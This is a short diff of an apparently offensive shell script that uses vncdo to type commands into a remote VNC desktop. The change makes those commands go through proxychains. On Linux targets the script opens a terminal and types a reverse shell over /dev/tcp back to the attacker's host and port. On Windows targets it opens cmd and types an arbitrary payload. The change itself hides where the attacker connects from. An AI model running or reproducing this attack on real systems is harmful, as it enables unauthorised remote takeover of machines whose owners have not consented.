@@ -129,7 +129,7 @@ rusure
 
 if [[ $platform = 'linux-gui' ]]
 then
-    vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
+    proxychains vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
     exit 1
 elif [[ $platform = 'win' ]]
 then
@@ -139,7 +139,7 @@ then
     
     rusure
     
-    vncdo -s $rhost::$rport key super-r pause 2 type 'cmd' key enter pause 4 type "$strn"  key enter
+    proxychains vncdo -s $rhost::$rport key super-r pause 2 type 'cmd' key enter pause 4 type "$strn"  key enter
 
     exit 1
 fi
